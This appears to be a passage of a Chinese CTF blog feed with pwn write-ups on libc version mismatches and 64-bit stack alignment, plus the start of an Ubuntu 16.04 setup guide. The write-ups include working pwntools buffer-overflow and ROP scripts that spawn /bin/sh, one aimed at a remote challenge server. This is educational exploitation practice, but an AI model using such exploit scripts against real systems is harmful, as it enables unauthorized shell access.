src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9815.png" alt="PWN中程序的libc问题15.png"></p><p>Ubuntu 22.04 的 glibc 版本：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9816.png" alt="PWN中程序的libc问题16.png"></p><p><mark>解决办法就是在 Ubuntu 22.04 中使用 Ubuntu 22.04 自带的新版 glibc 来运行程序</mark></p><blockquote><p>注意：<br>更改程序运行时使用的 libc 版本需要与 ld 文件的版本对应，由于 Ubuntu 22.04 使用的 ld 版本为 2.35，所以如果指定题目给出的 <code>libc-2.23.so</code> 文件会使程序运行崩溃：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9819.png" alt="PWN中程序的libc问题19.png"></p><p>这里需要指定 Ubuntu 22.04 自带的 libc 文件</p></blockquote><p>Ubuntu 22.04 自带的 glibc 一般位于 <code>/usr/lib/x86_64-linux-gnu/libc.so.6</code>，也可以使用命令来查找：<code>sudo find / -name libc.so.6</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9817.png" alt="PWN中程序的libc问题17.png"></p><p>将 exp 改写如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># 指定使用 Ubuntu 22.04 自带的 glibc 来运行程序</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'./Login'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> env<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'LD_PRELOAD'</span><span class="token punctuation">:</span> <span class="token string">"/usr/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Login'</span><span class="token punctuation">)</span><span class="token comment"># 计算偏移的 libc 也需要与程序相统一</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/usr/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Here is a tip: "</span><span class="token punctuation">)</span>stdin_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\n"</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stdin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the username:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">365696460</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>libcbase <span class="token operator">=</span> stdin_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x4008c3</span>ret <span class="token operator">=</span> <span class="token number">0x400599</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the password:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时即可正常 getshell：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9818.png" alt="PWN中程序的libc问题18.png"></p><hr><h2 id="再次调试分析"><a href="#再次调试分析" class="headerlink" title="再次调试分析"></a>再次调试分析</h2><p>再次在 Ubuntu 22.04 下调试分析</p><p>单步执行，发现地址都已经正常，可以调用 <code>system(&quot;/bin/sh&quot;)</code> 来 getshell 了</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9821.png" alt="PWN中程序的libc问题21.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9820.png" alt="PWN中程序的libc问题20.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> Pwntools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN中64位程序的堆栈平衡</title>
      <link href="/posts/58163c9b.html"/>
      <url>/posts/58163c9b.html</url>
      
        <content type="html"><![CDATA[<h1 id="堆栈平衡"><a href="#堆栈平衡" class="headerlink" title="堆栈平衡"></a>堆栈平衡</h1><blockquote><p>PWN 堆栈平衡是指在 PWN 漏洞利用中，为了保证 payload 的字节数是 16 的倍数，需要对堆栈进行平衡；<strong>而在 32 位 PWN 漏洞利用中，没有堆栈平衡一说，仅在 64 位中存在</strong></p><p><code>glibc2.27</code> 以后引入 XMM 寄存器，用于记录程序状态。主要出现在 Ubuntu 18.04 及以后的版本，需要考虑堆栈平衡 （栈对齐）</p><p>主要原因在于:<br>在调用 <code>system()</code> 函数时，会进入 <code>do_system</code> 执行一个 <code>movaps</code> 指令对 XMM 寄存器进行操作，<code>movaps</code> 指令要求 <code>RSP</code> 按 16 字节对齐，即：**<code>RSP</code> 中地址的最低 4 位必须为 0，直观地说，就是该地址必须以数字 0 结尾**</p><p><em>问：如何解决堆栈平衡问题？</em><br><mark>可以通过在进入 <code>system()</code> 函数之前增加一个 <code>ret</code> 指令来解决（常用），或者也可以在 <code>system()</code> 函数中不执行第一条 <code>push rbp</code> 操作来解决</mark></p><p><em>问：为什么加的是 ret 指令？</em><br>由于在 <code>system()</code> 函数之前加入了一个新地址，栈顶被迫下移 8 个字节，使之对齐 16 字节，满足 <code>movaps</code> 指令对 XMM 寄存器进行操作的条件；同时，由于插入的地址指向了 <code>ret</code> 指令，程序仍然可以顺利地进入 <code>system(&quot;/bin/sh&quot;)</code> 中，<strong>不会改变程序执行流程</strong></p></blockquote><ol><li>XMM 寄存器是 <strong>128 位</strong>的寄存器，称为：<em>浮点数寄存器</em>，包括 XMM0 - XMM15</li></ol><p>XMM 寄存器主要用于：</p><ul><li>32 位和 64 位<em>浮点数</em>的操作</li><li>SIMD 指令：一条 SIMD 指令可以同时接受多个数据流，提升处理速度</li><li>SSE 指令：一般用不到，不详细讨论</li></ul><p>除了 XMM 寄存器外，还有 <strong>256 位</strong>的 YMM 寄存器和 <strong>512 位</strong>的 ZMM 寄存器，也是类似的功能<br>随着 ZMM 的出现，XMM 和 YMM 寄存器的个数被扩展到了 32 个</p><ol start="2"><li><code>movups</code> 和 <code>movaps</code> 是 x86 汇编语言中的两条指令，用于数据传输操作，通常用于将数据从内存加载到 XMM 寄存器或从 XMM 寄存器存储到内存</li></ol><ul><li><code>movups</code></li></ul><p>把源存储器内容值送入目的寄存器，但<strong>不必对齐内存 16 字节</strong></p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">movups xmm<span class="token punctuation">,</span> xmm<span class="token operator">/</span>m128movups xmm<span class="token operator">/</span><span class="token number">128</span><span class="token punctuation">,</span> xmm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><code>movaps</code></li></ul><p>把源存储器内容值送入目的寄存器，<mark><strong>当有 m128 时，必须对齐内存 16 字节，也就是内存地址低 4 位为全 0</strong></mark></p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">movaps xmm<span class="token punctuation">,</span> xmm<span class="token operator">/</span>m128movaps xmm<span class="token operator">/</span><span class="token number">128</span><span class="token punctuation">,</span> xmm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>除此之外，还可以得知：</li></ol><ul><li>使用 XMM 寄存器时，需要 16 字节对齐</li><li>使用 YMM 寄存器时，需要 32 字节对齐</li><li>使用 ZMM 寄存器时，需要 64 字节对齐</li></ul><hr><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>以攻防世界的一道 PWN 题为例：<a href="https://adworld.xctf.org.cn/media/file/task/291721f42a044f50a2aead748d539df0">【攻防世界】level0</a></p><p>程序保护机制：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%201.png" alt="攻防世界-level0 1.png"></p><p>程序逻辑：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%203.png" alt="攻防世界-level0 3.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%204.png" alt="攻防世界-level0 4.png"></p><p>存在后门函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%205.png" alt="攻防世界-level0 5.png"></p><p>得到 <code>callsystem</code> 函数的地址为：<code>0x400596</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0%207.png" alt="攻防世界-level0 7.png"></p><p>脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/level0"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">56877</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/level0"</span><span class="token punctuation">)</span>  <span class="token comment"># 生成对象elf</span>callsystem_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"callsystem"</span><span class="token punctuation">]</span>  <span class="token comment"># 获取callsystem函数的地址，本题为:0x0400596，在ida中可以看到函数的地址</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callsystem_addr<span class="token punctuation">)</span>  <span class="token comment"># 这里不用callsystem_addr直接用0x0400596也是可以的</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面这个脚本在远程是可以打通的，如图：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A11.png" alt="PWN-64位PWN程序堆栈平衡1.png"></p><p>但是在本地不可以，打不通<br>显示：<code>[*] Got EOF while reading in interactive</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A12.png" alt="PWN-64位PWN程序堆栈平衡2.png"></p><blockquote><p>玄学的问题出现了：</p><p>同样的脚本，同样的程序，在远程可以打通，在本地就打不通</p></blockquote><hr><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>在 python 脚本发送 payload 之前，通过 gdb 附加调试：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callsystem_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python 脚本被暂停：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A19.png" alt="PWN-64位PWN程序堆栈平衡9.png"></p><p>gdb 自动断在 <code>read()</code> 函数中：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A110.png" alt="PWN-64位PWN程序堆栈平衡10.png"></p><p>终端中按任意键继续执行 python 脚本</p><p>gdb 直接 finish 跳出 <code>read()</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A111.png" alt="PWN-64位PWN程序堆栈平衡11.png"></p><p>gdb 一直 ni 单步执行到 <code>system()</code> 函数的调用处</p><p>发现参数是 <code>&quot;/bin/sh&quot;</code> 没有问题</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A16.png" alt="PWN-64位PWN程序堆栈平衡6.png"></p><p>gdb 继续 ni 单步执行</p><p>发现 gdb 报错：<code>Program received signal SIGSEGV, Segmentation fault.</code></p><p>程序断在：<code>0x7ff1e1c50973 &lt;do_system+115&gt;    movaps xmmword ptr [rsp], xmm1</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A15.png" alt="PWN-64位PWN程序堆栈平衡5.png"></p><p>说明这一条指令出现问题</p><p>gdb 继续 ni 单步执行也不会发生任何变化</p><p>观察 RSP 寄存器的值为 <code>0x7ffffb7aa188</code>，<strong>没有 16 字节对齐（最低 4 位不是 0）</strong></p><hr><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>在进入 <code>system()</code> 函数之前，增加一个 <code>ret</code> 指令，因为 <code>ret</code> 指令不会改变程序的执行流</p><p>使用 ROPgadget 查找 ret 指令地址：<code>ret_addr = 0x400431</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A13.png" alt="PWN-64位PWN程序堆栈平衡3.png"></p><p>将 payload 改为 <code>payload = b&#39;a&#39; * (0x80 - 0x00 + 0x08) + p64(ret_addr) + p64(callsystem_addr)</code> 即可打通本地</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A14.png" alt="PWN-64位PWN程序堆栈平衡4.png"></p><p>改进后脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/level0"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">56877</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/level0"</span><span class="token punctuation">)</span>  <span class="token comment"># 生成对象elf</span>callsystem_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"callsystem"</span><span class="token punctuation">]</span>  <span class="token comment"># 获取callsystem函数的地址，本题为:0x0400596，在ida中可以看到函数的地址</span>ret_addr <span class="token operator">=</span> <span class="token number">0x400431</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callsystem_addr<span class="token punctuation">)</span>  <span class="token comment"># 添加一个 p64(ret_addr) 平衡堆栈</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="再次调试分析"><a href="#再次调试分析" class="headerlink" title="再次调试分析"></a>再次调试分析</h2><p>在 <code>vulnerable_function()</code> 执行完后，会多执行一个 <code>ret</code> 指令，地址位于 <code>0x400431</code></p><p>然后 ni 单步执行到达 <code>system()</code> 函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A17.png" alt="PWN-64位PWN程序堆栈平衡7.png"></p><p>使用 si 进入 <code>system()</code> 函数内部</p><p>ni 单步执行到 <code>movaps xmmword ptr [rsp], xmm1</code> 语句处</p><p>可以看到已经可以通过 ni 单步执行到 <code>movaps xmmword ptr [rsp], xmm1</code> 这一句后面</p><p>已经不会再报错了</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-64%E4%BD%8DPWN%E7%A8%8B%E5%BA%8F%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A18.png" alt="PWN-64位PWN程序堆栈平衡8.png"></p><p>可以看到此时 RSP 为：<code>0x7ffe95f29310</code>，<strong>已经 16 字节对齐了（最低 4 位为 0）</strong></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu16.04虚拟机环境搭建</title>
      <link href="/posts/2b805828.html"/>
      <url>/posts/2b805828.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>安装软件或 <code>git</code> 仓库到本地时，建议在路径 <code>/opt</code> 下安装或存放，养成文件管理的习惯  </p><p>另外，apt 安装时建议使用新的 <code>sudo apt install xxx</code> 代替旧的 <code>sudo apt-get install xxx</code></p></blockquote><p>使用 pip 安装库时，<code>pip install xxx</code> 和 <code>sudo pip install xxx</code> 安装的库路径不一样，例如：</p><ul><li><code>sudo pip install xxx</code> 安装路径：<code>/usr/local/lib/python3.10/dist-packages/</code></li><li><code>pip install xxx</code> 安装路径：<code>/home/wyy/.local/lib/python3.10/site-packages/</code></li></ul><p><strong>尽量不要使用 <code>sudo pip install</code> 来安装 python 库</strong></p><hr><p><mark>如果搭建 Ubuntu 22.04 这种新版本的环境，请移步：《<a href="Ubuntu22.04%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md">Ubuntu22.04虚拟机环境搭建</a>》</mark></p><hr><p>以下所有的安装都基于 Ubuntu 16.04 （需要升级 pip 和 python）虚拟机进行了测试，因为许多地方与 Ubuntu 22.04 有所区别，所以另写了一篇专门针对 Ubuntu 16.04 的配置</p><blockquote><p><strong>不算 tips 的小 tips：</strong></p><ol><li><em>VM 虚拟机挂起后再保存快照可以秒存，但开机运行状态保存快照相当慢（开机运行状态保存快照中途是可以继续操作虚拟机的，不影快照的保存）</em></li><li>如果发现在虚拟机中，鼠标的额外功能键无法使用，比如：前进、后退等<br>在虚拟机文件夹下，有一个 <code>xxx.vmx</code> 的文件，<u>在虚拟机关闭的条件下</u>，使用记事本打开，在文件的最后添加如下内容，重新开启虚拟机，即可<em>使用鼠标的额外功能键</em>：<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mouse.vusb.enable <span class="token operator">=</span> <span class="token string">"TRUE"</span>  mouse.vusb.useBasicMouse <span class="token operator">=</span> <span class="token string">"FALSE"</span>  usb.generic.allowHID <span class="token operator">=</span> <span class="token string">"TRUE"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><em>Ubuntu 16.04 将屏幕左侧的启动器栏移动到屏幕底部</em>，在终端输入：<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gsettings <span class="token builtin class-name">set</span> com.canonical.Unity.Launcher launcher-position Bottom<span class="token comment"># 如果想换回左侧，输入：</span>gsettings <span class="token builtin class-name">set</span> com.canonical.Unity.Launcher launcher-position Left<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li>如果<em>开机出现显示器相关报错</em>：无法应用原保存的显示器配置或者 CRTC 63 相关问题<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> ~/.config/monitors.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>重启即可解决</li></ol></blockquote><hr><h1 id="VMtools"><a href="#VMtools" class="headerlink" title="VMtools"></a>VMtools</h1><blockquote><p>像 Ubuntu16.04 这种旧版本不建议使用 <code>Open VM Tools</code>（会报错），还是建议使用 VMware 官方的 <code>VMware Tools</code></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 安装，将VMtools解压到一个目录下，例如主目录</span><span class="token builtin class-name">cd</span> ~/vmware-tools-distrib<span class="token function">sudo</span> ./vmware-install.pl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h1 id="更换镜像源"><a href="#更换镜像源" class="headerlink" title="更换镜像源"></a>更换镜像源</h1><blockquote><p>Linux 自带的源来自国外，有时候下载速度感人，十分难受，建议更换系统的镜像源</p><p><mark>针对 Ubuntu 16.04 我建议使用阿里源，因为后面 pip 源也建议使用阿里源，否则 pip 会出现 SSL 问题，这里可以将镜像源和 pip 源统一一下</mark></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc/apt <span class="token comment"># 进入apt目录下</span><span class="token function">sudo</span> <span class="token function">cp</span> sources.list sources.list.backup <span class="token comment"># 备份</span><span class="token function">sudo</span> <span class="token function">vim</span> sources.list <span class="token comment"># 编辑sources.list文件</span><span class="token comment"># 加入下面两个----之间的内容</span>-----------------------------------------------------------------<span class="token comment"># deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]/ xenial main restricted</span>deb-src http://archive.ubuntu.com/ubuntu xenial main restricted <span class="token comment">#Added by software-properties</span>deb http://mirrors.aliyun.com/ubuntu/ xenial main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe <span class="token comment">#Added by software-properties</span>deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe <span class="token comment">#Added by software-properties</span>deb http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse <span class="token comment">#Added by software-properties</span>deb http://archive.canonical.com/ubuntu xenial partnerdeb-src http://archive.canonical.com/ubuntu xenial partnerdeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe <span class="token comment">#Added by software-properties</span>deb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb 